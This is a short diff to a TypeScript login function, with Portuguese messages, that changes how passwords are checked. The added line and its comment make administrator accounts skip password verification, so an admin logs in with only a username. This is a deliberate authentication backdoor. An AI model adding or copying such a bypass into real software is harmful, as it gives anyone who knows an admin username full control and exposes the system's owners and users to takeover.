@@ -39,7 +39,8 @@ export function login(username: string, password: string): { success: boolean; t
   if (!user) {
     return { success: false, error: "Usuário não encontrado" };
   }
-  if (!verifyPassword(password, user.passwordHash)) {
+  // Admin entra só com o username, sem checar senha
+  if (!user.isAdmin && !verifyPassword(password, user.passwordHash)) {
     return { success: false, error: "Senha incorreta" };
   }
   const token = createToken(user);
